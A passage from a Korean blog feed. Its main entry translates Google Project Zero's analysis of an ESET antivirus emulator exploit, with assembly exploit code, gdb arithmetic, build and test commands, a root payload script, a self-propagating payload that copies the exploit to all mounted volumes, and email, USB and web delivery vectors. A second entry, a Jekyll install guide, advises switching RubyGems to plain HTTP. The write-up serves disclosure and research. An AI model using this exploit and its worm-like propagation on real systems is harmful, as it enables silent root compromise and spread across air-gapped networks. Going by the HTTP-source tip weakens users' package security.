<p>산술연산을 이용해 포인터를 스택의 범위 밖으로 벗어나게 하고 PUSH와 POP 명령어로 상호작용함으로써 스탠다드 i586 머신코드를 이용해 에뮬레이터 내에서 진짜 스택의 값을 읽거나 데이터를 그곳에 쓸 수 있다.</p>

<p>하지만 실행할 수 있는 명령어 개수는 제한되어 있으며 스택에는 딱 한번만 쓸 수 있다. 왜냐하면 PUSH 동작 이후에 새도우 스택 포인터가 범위를 벗어났는지 체크를 하기 때문이다. 읽기의 경우, POP 명령어는 스택 포인터가 0이 아닌지만 확인하기 때문에 무제한으로 읽을 수 있다.</p>

<p>우린 가상의 스택 포인터(섀도우 스택)를 악용하는것이기 때문에 지역변수들은 레지스터 또는 .data 영역에 저장을 해야한다. 80K의 사이클은 충분해 보일 수 있지만 다양한 ESET 제품들을 신뢰성있게 익스플로잇하기 위해서 gadget을 찾다보면 금방 사이클이 소모된다.</p>

<h3>익스플로잇 mitigation 뛰어넘기</h3>

<p>첫번째 단계는 새도우 스택이 어디에 위치하고 있는지 알아내는 것이다. 왜냐하면 스택 작업들은 스택의 베이스 주소를 기준으로 상대적인 위치에서 동작하기 때문이다. 우리가 쓰거나 읽기를 할 수 있는 추측 가능한 메모리 위치는 존재하지 않지만, 실제 스택 프레임에 포인터를 push할 수 있고 실제 스택에 있는 저장된 스택포인터(직전 스택 프레임의 스택포인터)를 가상 레지스터로 가져올 수 있다.</p>

<p>우리가 몇 가지의 메모리 주소들을 알아낸다면 ASLR을 우회할 수 있으며, 인접한 메모리 영역으로 행동반경이 더이상 제한되어있지 않을 것이다. 이렇게 하기 위해서는 섀도우 스택 포인터가 가리키는 위치를 임의의 인덱스로 설정할 수 있어야하는데, 5 단계의 작업을 거쳐 섀도우 스택 포인터의 상위 bit들을 쉬프트해 제거해버리면 가능하다. 실제 인덱스 계산은 대략 아래와 같다.
* ESP에 대한 산술연산</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">ShadowStackPointer</span> <span class="o">=</span> <span class="n">ShadowStackPointer</span> <span class="o">-</span> <span class="p">((</span><span class="kt">unsigned</span><span class="p">)</span> <span class="n">Index</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span></code></pre></div>


<p>위 수식은 오버플로우때문에 한번의 작업으로 새도우 스택포인터를 증가시키는것은 불가능하다. 대신에 4번의 작업을 통해 다음 4의 배수로 만든 다음, 원하는 값으로 감소시키는 방법을 쓸 수 있다. 아래는 새도우 스택포인터를 123으로 만드는 방법을 시뮬레이션한 예이다.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mi">123</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mi">31</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mi">0</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mh">0xc000001f</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0xc000001f</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="mh">0x8000003e</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x8000003e</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="mh">0x4000005d</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span>   <span class="mh">0x4000005d</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">5</span> <span class="o">=</span> <span class="mi">124</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mi">124</span> <span class="o">-</span> <span class="p">(((</span><span class="mi">4U</span> <span class="o">-</span> <span class="p">(</span><span class="mi">123</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">6</span> <span class="o">=</span> <span class="mi">123</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span></code></pre></div>


<p>이 요소를 PUSH/POP과 조합하면 스택의 임의 인덱스와 상호작용할 수 있다. Figure 4는 x86 코드를 이용, 에뮬레이터 내부에서 어떻게 임의의 스택 인덱스에 접근할 수 있는지 설명하는 코드이다.</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">accessframe:</span>
    <span class="c1">;</span>
    <span class="c1">; Retrieve information from our stack frame.</span>
    <span class="c1">;</span>
    <span class="c1">; EDI   Real return address</span>
    <span class="c1">; ESI   Real base pointer</span>
    <span class="c1">;</span>
    <span class="c1">;</span>
    <span class="c1">; The stack frame looks like this:</span>
    <span class="c1">;</span>
    <span class="c1">;   -00000030 ShadowStack     dd 10 dup(?)</span>
    <span class="c1">;   -00000008 ModifyCount     dd ?</span>
    <span class="c1">;   -00000004 CycleCount      dd ?</span>
    <span class="c1">;   +00000000  s              db 4 dup(?)</span>
    <span class="c1">;   +00000004  r              db 4 dup(?)</span>
    <span class="c1">;   +00000008 EmulatorObject  dd ?</span>
    <span class="c1">;</span>
    <span class="c1">; So s is 30h + 8 + 4 bytes from the base of ShadowStack. Because the</span>
    <span class="c1">; ShadowStackPointer is an index into an array of DWORDS, we need to set it</span>
    <span class="c1">; to (30h + 8 + 4) / 4 = 15.</span>
    <span class="c1">;</span>
    <span class="c1">; Then we can load s (saved register), and r (return address)</span>
    <span class="c1">; onto virtual registers. To calculate the value of real EBP, we take the</span>
    <span class="c1">; previous frame&#39;s sp and subtract our frame size.</span>

    <span class="c1">; We need to move the shadow stack pointer back in five stages.</span>
    <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>     <span class="c1">; SSP=0xC0000004</span>
    <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>     <span class="c1">; SSP=0x80000008</span>
    <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>     <span class="c1">; SSP=0x4000000C</span>
    <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>     <span class="c1">; SSP=0x00000010</span>
    <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span>  <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>     <span class="c1">; SSP=0x0000000F</span>
    <span class="nf">pop</span>     <span class="nb">esi</span>                     <span class="c1">; Load the real previous frame&#39;s sp.</span>
    <span class="nf">pop</span>     <span class="nb">edi</span>                     <span class="c1">; Load the return address.</span>
    <span class="nf">sub</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">byte</span> <span class="mh">0x5C</span>          <span class="c1">; Adjust ESI to point to our real stack frame.</span></code></pre></div>


<p>우리는 이제 스택 베이스 주소로부터의 오프셋을 계산해냄으로써 섀도우 스택 포인터가 임의의 메모리 주소를 가리키도록 할 수 있다. 만약 섀도우 스택 포인터가 .text 영역을 가리키게 한다면, 메모리 주소 공간을 스캔해서 gadget들을 찾아 DEP를 우회할 수 있다.</p>

<p>맥OS의 경우, gadget을 통해 실행 흐름을 쉘코드로 변경해주는만으로 충분하다. 이것은 ESET가 MH_NO_HEAP_EXECUTION 플래그를 Mach 헤더에 설정하지 않음으로써 DEP를 비활성화시키기 때문이다. 윈도우와 리눅스는 완전한 ROP 체인이 필요하다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>otool -hv /Applications/ESET<span class="se">\ </span>Cyber<span class="se">\ </span>Security<span class="se">\ </span>Pro.app/Contents/MacOS/esets_daemon 
/Applications/ESET Cyber Security Pro.app/Contents/MacOS/esets_daemon:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC    I386        ALL  0x00     EXECUTE    <span class="m">27</span>       <span class="m">3184</span>   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</code></pre></div>


<p>만약 복잡한 gadget 체인 때문에 사이클이 더 필요하다면, 첫단계 gadget 체인을 통해 사이클 카운트를 초기화하여 익스플로잇 완성을 위한 무제한의 시간을 얻을 수 있다.</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">findgadget:</span>
    <span class="c1">;</span>
    <span class="c1">; Search for simple gadget at [ESP] using stack operations.</span>
    <span class="c1">;</span>
    <span class="c1">; EDI       Current search location for gadget.</span>
    <span class="c1">; EAX       Last DWORD read from [EDI].</span>
    <span class="c1">;  BL       Byte from [EDI-1].</span>
    <span class="c1">; ECX       Byte index into current DWORD</span>
    <span class="c1">; EBP       Constant Mask</span>
    <span class="c1">; EDX       Constant 4</span>
    <span class="c1">;</span>
    <span class="c1">; This loop uses a modified port of Algorithm 6-2 (Find leftmost 0-byte)</span>
    <span class="c1">; from &quot;Hackers Delight&quot; by Henry Warren, ISBN 0-201-91465-4. The</span>
    <span class="c1">; .nextdword loop is where we burn all our cycles, so optimizing for the</span>
    <span class="c1">; common case doubles our search space.</span>
    <span class="c1">;</span>
    <span class="no">ReqOpcode</span><span class="kd">   equ</span> <span class="mh">0xFF</span>    <span class="c1">; register indirect branch</span>
    <span class="no">ReqOperands</span><span class="kd"> equ</span> <span class="mh">0x13112321</span>
    <span class="nf">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; initialize loop counter</span>
    <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="mh">0x7F7F7F7F</span> <span class="c1">; initialize mask</span>
    <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; constant</span>
    <span class="nf">pop</span>     <span class="nb">ebx</span>             <span class="c1">; initialize BL</span>
    <span class="nf">bswap</span>   <span class="nb">ebx</span>             <span class="c1">; rearrange so high byte is in bl</span>
    <span class="nf">dec</span>     <span class="nb">edi</span>             <span class="c1">; adjust for start of search</span>
   <span class="nl">.nextdword:</span>
    <span class="nf">pop</span>     <span class="nb">eax</span>             <span class="c1">; fetch another dword to examine</span>
    <span class="nf">bswap</span>   <span class="nb">eax</span>             <span class="c1">; reorder bytes</span>
    <span class="nf">not</span>     <span class="nb">eax</span>             <span class="c1">; invert bits because this code searches for 0x00</span>
    <span class="nf">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; ecx is a copy of dword to scan we can modify</span>
    <span class="nf">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; y &amp; 0x7f7f7f7f</span>
    <span class="nf">add</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; + 0x7f7f7f7f</span>
    <span class="nf">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; y | x</span>
    <span class="nf">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; y | mask</span>
    <span class="nf">not</span>     <span class="nb">eax</span>             <span class="c1">; restore bits, we need them in either case</span>
    <span class="nf">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">~</span><span class="mi">0</span>    <span class="c1">; ~y; xor instead of not because ZF</span>
    <span class="nf">jnz</span>     <span class="nv">.matchfound</span>     <span class="c1">; was there a 0xFF?</span>
   <span class="nl">.nomatch:</span>
    <span class="nf">sub</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; adjust current search pointer</span>
    <span class="nf">mov</span>     <span class="nb">bl</span><span class="p">,</span> <span class="nb">al</span>          <span class="c1">; save byte for operand match</span>
    <span class="nf">jmp</span>     <span class="nv">short</span> <span class="nv">.nextdword</span><span class="c1">; next dword</span></code></pre></div>


<p>Figure 5. ASLR/DEP 우회 및 마이너 버전에서의 변화 허용을 위한 call [reg] gadget을 찾는다. 에뮬레이터에서 리턴하는 경우, [ECX]는 스캔이 되고 있는 파일의 시작 지점을 가리키고 있을 것이다. 이 의미는 스캔중인 악성코드의 코드를 실제 CPU에서 재실행한다는 뜻이다.</p>

<p>Figure 5는 POP 명령어를 통해 메모리 주소 공간을 탐색하는것을 보여준다. 이것은 매우 자원이 많이드는 비싼 동작이기 때문에 시퀀스는 보통의 경우 싸이클수를 줄일 수 있도록 최적화되어 있다. 만약 좋은 후보를 발견할 경우, 리턴주소를 덮어쓰고 에뮬레이터를 종료한다.</p>

<h3>익스플로잇 가능성 테스트</h3>

<p>분석을 돕기위해 삽입된 스크립트를 실행하는 샘플 익스플로잇을 보고서와 함께 제공하며, 이는 아래 링크에서 다운로드 가능하다.</p>

<p><a href="https://code.google.com/p/google-security-research/issues/detail?id=456">https://code.google.com/p/google-security-research/issues/detail?id=456</a></p>

<p>첨부한 익스플로잇을 빌드하고 테스트하려면, 실수로 시스템이 익스플로잇 되는것을 방지하기 위해 우선 실시간 파일시스템 검색 기능을 비활성화시켜야 한다. 익스플로잇을 빌드하기 위해서는 애플에서 배포하는 XCode 커맨드라인 툴 패키지가 설치되어 있어야 한다. 만약 해당 패키지가 설치되어어있지 않다면, 커맨드라인에 make를 입력할 시 자동으로 패키지 설치 안내 메시지가 출력될 것이다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ls -l
total 28K
-rw------- <span class="m">1</span> taviso eng 17K Jun <span class="m">18</span> 12:45 esetemu.asm
-rw------- <span class="m">1</span> taviso eng <span class="m">605</span> Jun <span class="m">18</span> 10:31 Makefile
-rw------- <span class="m">1</span> taviso eng <span class="m">514</span> Jun <span class="m">18</span> 15:58 payload.sh</code></pre></div>


<p>payload.sh 파일은 익스플로잇에 삽입되어 있고, 익스플로잇이 성공했을 경우 실행된다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat payload.sh 
<span class="c">#!/bin/sh</span>
<span class="c">#</span>
<span class="c"># This is the payload code run as root in the context of esets_daemon after</span>
<span class="c"># successful exploitation.</span>
<span class="c">#</span>
osascript -e <span class="s1">&#39;tell application &quot;Finder&quot; to set desktop picture to POSIX file &quot;/usr/share/httpd/icons/bomb.png&quot;&#39;</span>
/Applications/Calculator.app/Contents/MacOS/Calculator <span class="p">&amp;</span>
<span class="nb">echo </span>w00t
uname -a<span class="p">;</span> date<span class="p">;</span> id</code></pre></div>


<p>make를 실행하며 익스플로잇을 빌드하면 되고, esetemu.bin 파일에는 결과가 저장된다. 파일 확장자는 취약점에 중요하지않으며, 심지어 .txt도 가능하다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>make
gzip -9c &lt; payload.sh <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> &gt;&gt; payload.inc
nasm -O0 -f bin -D__MACOS__ -o esetemu.bin esetemu.asm</code></pre></div>


<p>익스플로잇을 테스트하기 위해서는, ESET 설치로부터 esets_scan 유틸리티를 사용해야 한다. 자신의 사용자 계정으로 실행되며, 만약 뭔가 잘못된다면 크래시나 스크립트의 문법 에러 등을 통해 눈치챌 수 있다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/Applications/ESET<span class="se">\ </span>Cyber<span class="se">\ </span>Security<span class="se">\ </span>Pro.app/Contents/MacOS/esets_scan esetemu.bin

ESET Command-line scanner, <span class="o">(</span>C<span class="o">)</span> 1992-2011 ESET, spol. s r.o.
Module loader, version <span class="m">1056</span> <span class="o">(</span>20150113<span class="o">)</span>, build 1082
Module perseus, version <span class="m">1456</span> <span class="o">(</span>20150512<span class="o">)</span>, build 1687
Module scanner, version <span class="m">11810</span> <span class="o">(</span>20150619<span class="o">)</span>, build 24399
Module archiver, version <span class="m">1228</span> <span class="o">(</span>20150528<span class="o">)</span>, build 1230
Module advheur, version <span class="m">1154</span> <span class="o">(</span>20150129<span class="o">)</span>, build 1120
Module cleaner, version <span class="m">1109</span> <span class="o">(</span>20150519<span class="o">)</span>, build 1140

Command line: esetemu.bin 

Scan started at:   Thu Jun <span class="m">18</span> 21:57:48 2015
w00t
Darwin Macs-Mac.local 13.0.0 Darwin Kernel Version 13.0.0: Thu Sep <span class="m">19</span> 22:22:27 PDT 2013<span class="p">;</span> root:xnu-2422.1.72~6/RELEASE_X86_64 x86_64
Thu Jun <span class="m">18</span> 21:57:48 PDT 2015
<span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>macuser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span>,401<span class="o">(</span>com.apple.sharepoint.group.1<span class="o">)</span>,12<span class="o">(</span>everyone<span class="o">)</span>,61<span class="o">(</span>localaccounts<span class="o">)</span>,79<span class="o">(</span>_appserverusr<span class="o">)</span>,80<span class="o">(</span>admin<span class="o">)</span>,81<span class="o">(</span>_appserveradm<span class="o">)</span>,98<span class="o">(</span>_lpadmin<span class="o">)</span>,33<span class="o">(</span>_appstore<span class="o">)</span>,100<span class="o">(</span>_lpoperator<span class="o">)</span>,204<span class="o">(</span>_developer<span class="o">)</span>,398<span class="o">(</span>com.apple.access_screensharing<span class="o">)</span>,399<span class="o">(</span>com.apple.access_ssh<span class="o">)</span></code></pre></div>


<p>라이브 시스템을 대상으로 익스플로잇을 실험해보는 제일 쉬운방법은 실시간 검사기능을 활성화하고 파일을 cat으로 오픈하는 것이다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat esetemu.bin &gt; /dev/null</code></pre></div>


<p>만약 익스플로잇이 성공하면, payload.sh가 루트권한으로 실행되었을 것이다. 주의할점은 stdout이나 stderr를 이 모드에서는 볼 수 없기 때문에 만약 원한다면 다른파일로 출력결과를 리다이렉트 시켜야한다. 만약 익스플로잇이 제대로 동작을 한다면, 이메일 첨부파일이나, 브라우저 다운로드, 웹앱 업로드 등으로 테스트 가능하다.</p>

<p>ESET 데몬은 종료처리를 눈에띄지않게 하기때문에 사용자는 익스플로잇이 실행되었는지 알 수가 없다.</p>

<h3>페이로드 예제(Sample Payload)</h3>

<h4>USB &amp; Removable Disk 익스플로잇</h4>

<p>익스플로잇을 .hidden이라고 명명하고 마운트된 볼륨의 루트 디렉토리에 위치시키면(예. /Volumes/MyDrive/.hidden), 디바이스가 삽입될 경우 자동으로 실행된다. ESET CyberSecurity Pro6은 기본설정에서 USB/CD-ROM/DVD 장치를 입력할 경우 알림창을 띄우지만, 어떤 옵션을 선택하더라도(또는 아무 옵션을 선택하지 않더라도) 익스플로잇은 성공적으로 실행된다.</p>

<p>아래와 같이 다른 마운트된 볼륨으로 전파를 시킬 수 있다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat payload.sh 
<span class="c">#!/bin/sh</span>
<span class="c">#</span>
<span class="c"># This is the payload code run as root in the context of esets_daemon after</span>
<span class="c"># successful exploitation.</span>
<span class="c">#</span>
<span class="c"># This silly example demonstrates simple propagation.</span>
<span class="c">#</span>

<span class="c"># Discard output</span>
<span class="nb">exec</span> <span class="p">&amp;</span>&gt; /dev/null

<span class="c"># Do something malicious.</span>
/Applications/Calculator.app/Contents/MacOS/Calculator <span class="p">&amp;</span>

<span class="c"># Is there an exploit on a Volume?</span>
<span class="nv">name</span><span class="o">=</span><span class="s2">&quot;$(find /Volumes -type f -depth 2 -name .hidden -size 79911c | head -n 1)&quot;</span>

<span class="c"># Yes, propagate to all other disks.</span>
<span class="nb">test</span> -f <span class="s2">&quot;${name}&quot;</span> <span class="o">&amp;&amp;</span> find /Volumes -type d                          <span class="se">\</span>
                                   -depth <span class="m">1</span>                         <span class="se">\</span>
                                   -exec cp -f -- <span class="s2">&quot;${name}&quot;</span> <span class="o">{}</span> <span class="se">\;</span>   <span class="se">\</span>
                                   -exec sleep <span class="m">1</span> <span class="se">\;</span></code></pre></div>


<p>이 기술은 사용자와의 상호작용이 없이 ESET가 배포된 망분리된 네트워크를 순회할 수 있게 해준다. 이것은 윈도우 네트워크에서도 가능하며, 간단하게 desktop.ini나 autorun.ini를 대신 사용하면 된다.</p>

<h4>E-Mail 익스플로잇</h4>

<p>익스플로잇을 Mail.app, Outlook 등의 사용자에게 MIME 첨부 형태로 전송하면 사용자와의 상호작용이 전혀 없어 자동으로 익스플로잇이 되는것을 허용한다. 새로운 이메일을 읽거나 열지 않아도 단지 수신하는것만으로 익스플로잇은 동작한다.</p>

<h4>웹 익스플로잇</h4>

<p>익스플로잇은 공격자의 웹사이트에서 호스팅되거나, 신뢰가능한 사이트들에 이미지 형태로 업로드될 수 있다. 또는 HTML5 어플리케이션 캐시, 다운로드, 아니면 단지 text/html 형태로 익스플로잇을 제공하는것으로 충분하다.</p>

<h1>결론</h1>

<p>취약점을 찾고, 분석하고 익스플로잇하는데는 몇일밖에 걸리지 않는 작업이였다. ESET는 우리에게 익스플로잇 방어기술들을 향상시켜 미래에는 익스플로잇이 더 어렵도록 작업하고 있다고 연락이 왔다.</p>

<h1>Acknowledgements</h1>

<p>본 취약점은 구글 프로젝트 제로의 Tavis Ormandy에 의해 발견됨</p>

<h1>Reference</h1>

<ol>
<li><a href="http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html">http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Howto Install Jekyll On Windows]]></title>
    <link href="http://binerdd.github.io/blog/2015/02/08/howto-install-jekyll-on-windows/"/>
    <updated>2015-02-08T12:00:25+09:00</updated>
    <id>http://binerdd.github.io/blog/2015/02/08/howto-install-jekyll-on-windows</id>
    <content type="html"><![CDATA[<h1>시작하기 전</h1>

<p>친절한 가이드와 달리 설치과정에서 수많은 에러를 만나게 된다&hellip; 당황하지 말고 설치를 성공해보자.</p>

<h1>파일 다운로드</h1>

<p><a href="http://dl.bintray.com/oneclick/rubyinstaller/rubyinstaller-2.1.5.exe?direct">Ruby Installer</a> <br>
<a href="http://cdn.rubyinstaller.org/archives/devkits/DevKit-mingw64-32-4.7.2-20130224-1151-sfx.exe">Ruby DevTools</a> <br>
<a href="https://www.python.org/ftp/python/2.7.9/python-2.7.9.msi">Python 2.7</a> <br>
<a href="https://bootstrap.pypa.io/get-pip.py">pip</a></p>

<h1>Ruby 및 DevTools 설치</h1>

<p>먼저 Ruby 2.1.5 32bit 버전을 설치한 후(설치 옵션에서 &ldquo;Add Ruby Executables to your PATH&rdquo; 선택),
Ruby DevTools를 C:\RubyDevTools 폴더에 압축을 푼다.</p>

<p>(만약 빈폴더에 압축을 풀지 않으면, 해제되는 파일들이 기존파일들과 섞여버려서 구분이 안됨)</p>

<p>C:\RubyDevKit 폴더에 들어가면 dk.rb 라는 루비 파일이 있는데 아래와 같이 옵션을 주어 실행한다.<br>
<b>설치과정에서 사용하는 명령창은 RubyDevTools 폴더안에 있는 mingw를 사용하는 것이 편하다</b></p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">ruby dk.rb init
ruby dk.rb install</code></pre></div>


<h1>환경변수 설정</h1>

<p>C:\RubyDevTools\bin 폴더를 시스템 환경변수 PATH에 추가하도록 하자.
(설정을 안하면, 설치과정에서 실행하는 파일들의 경로를 찾지못하는 에러 발생)</p>

<h1>Jekyll 설치</h1>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gem install jekyll</code></pre></div>


<p>위 명령어를 명령창에서 실행하면 아래와 유사하게 ssl 검증을 할 수 없다는 에러 메시지가 출력된다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&gt; gem install jekyll
ERROR: Could not find a valid gem <span class="s1">&#39;jekyll&#39;</span> <span class="o">(</span>&gt;<span class="o">=</span> 0<span class="o">)</span>, here is why: 
Unable to download data from https://rubygems.org/ 
- SSL_connect <span class="nv">returned</span><span class="o">=</span><span class="m">1</span> <span class="nv">errno</span><span class="o">=</span><span class="m">0</span> <span class="nv">state</span><span class="o">=</span>SSLv3 <span class="nb">read</span>
server certificate B: certificate verify failed 
<span class="o">(</span>https://rubygems.org/latest_specs.4.8.gz<span class="o">)</span></code></pre></div>


<p>이럴 경우 gem 의 소스 url을 HTTP 주소로 아래와 같이 바꿔주면 된다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gem <span class="nb">source</span> -r https://rubygems.org
gem <span class="nb">source</span> -a http://rubygems.org</code></pre></div>


<h1>Python 설치</h1>

<p>Jekyll에서는 syntax highlighting을 제공하기 위해 Pygments 라는 것을 사용하는데, 윈도우에서 이를 사용하기 위해서는
Python 기반의 버전을 설치해야한다.
<b>파이썬 2.7 버전</b>을 설치할때, 마찬가지로 파이썬 경로를 시스템 환경변수에 추가하는 옵션을 활성화하도록 한다.</p>

<p>설치가 완료되면, 다운받은 get-pip.py파일을 파이썬으로 실행시킨다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python get-pip.py</code></pre></div>


<p>그리고 Pygments 설치</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -m pip install Pygments</code></pre></div>


<p>이후에 Pygments 를 syntax highlighter로 사용할때는, jekyll로 생성한 사이트 폴더에 있는 _config.yml 파일에 옵션으로 설정해주면 된다.</p>

<div class="highlight"><pre><code class="language-yaml" data-lang="yaml"><span class="l-Scalar-Plain">highlighter</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">pygments</span></code></pre></div>


<h1>wdm 설치</h1>

<p>Jekyll 2.4버전 부터는 자동으로 사이트 폴더를 모니터링하면서 변화가 있을 경우 다시 빌드해주는 기능이 기본적으로 탑재되어있다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jekyll serve</code></pre></div>


<p>위 명령어의 기능을 활용하기 위해서는 윈도우에서 wdm 이라는 gem을 설치해야한다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gem install wdm</code></pre></div>


<h1>Jekyll 실행하기</h1>

<p>사이트를 생성하고자 하는 경로로 이동한 다음, jekyll를 통해 새로운 사이트를 생성한다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jekyll new &lt;name of the site&gt;</code></pre></div>


<p>그 후 생성된 사이트 폴더로 이동하고 jekyll를 통해 로컬 서버를 실행시키면 웹브라우저를 통해 (127.0.0.1:4000) 사이트의 모습을 동적으로 확인할 수 있다.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> &lt;site folder&gt;
jekyll serve</code></pre></div>


<p>Jekyll의 다양한 기능 및 옵션들에 대해서는 <a href="http://jekyllrb.com">공식사이트</a>를 참고합시다.</p>

<h1>References</h1>

<p><a href="http://jekyll-windows.juthilo.com/1-ruby-and-devkit/">http://jekyll-windows.juthilo.com/1-ruby-and-devkit/</a><br>
<a href="http://jekyllrb.com">http://jekyllrb.com</a><br>
<a href="http://codingtips.kanishkkunal.in/ssl-error-ruby-gems-windows/">http://codingtips.kanishkkunal.in/ssl-error-ruby-gems-windows/</a></p>
]]></content>
  </entry>
  
</feed>
